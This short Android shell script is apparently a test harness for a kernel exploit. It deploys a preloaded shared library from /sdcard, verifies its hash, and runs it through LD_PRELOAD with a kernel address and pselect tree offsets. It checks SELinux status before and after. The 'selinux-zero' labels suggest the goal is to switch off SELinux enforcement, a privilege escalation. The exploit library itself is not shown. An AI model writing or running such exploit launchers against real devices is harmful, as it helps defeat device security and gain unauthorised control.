#!/system/bin/sh
# mt11 v30技术提升型: selinux-zero 测试 (deep chain + OFF架构 + selinux-8 parent)
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt13_v30tech.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt13_test1.txt

echo "=== [1/4] 部署 ==="
rm -f $DST; cp $SRC $DST; sync
SRC_H=$(sha256sum $SRC | awk '{print $1}')
DST_H=$(sha256sum $DST | awk '{print $1}')
echo "src=$SRC_H dst=$DST_H"
[ "$SRC_H" = "$DST_H" ] || { echo "❌ 哈希不一致"; exit 1; }
echo "✅ 哈希一致"

echo "=== [2/4] SELinux 状态 (前) ==="
getenforce 2>&1 | tee $LOG

echo "=== [3/4] 运行 (selinux-zero) ==="
PSELECT_SHIFT=0 \
PSELECT_TREE_PC=ffffff8002a41b91 \
PSELECT_TREE_RIGHT=0 \
PSELECT_TREE_LEFT=0 \
PSELECT_PI_PARENT=0 \
PSELECT_PI_RIGHT=0 \
PSELECT_PI_LEFT=0 \
PSELECT_PAT_C0=1 \
PSELECT_ONE_SHOT=1 \
LD_PRELOAD=$DST /system/bin/sleep 45 2>&1 | tee -a $LOG
echo "preload exit=$?"

echo "=== [4/4] SELinux 状态 (后) ==="
getenforce 2>&1 | tee -a $LOG
echo "=== DONE ==="
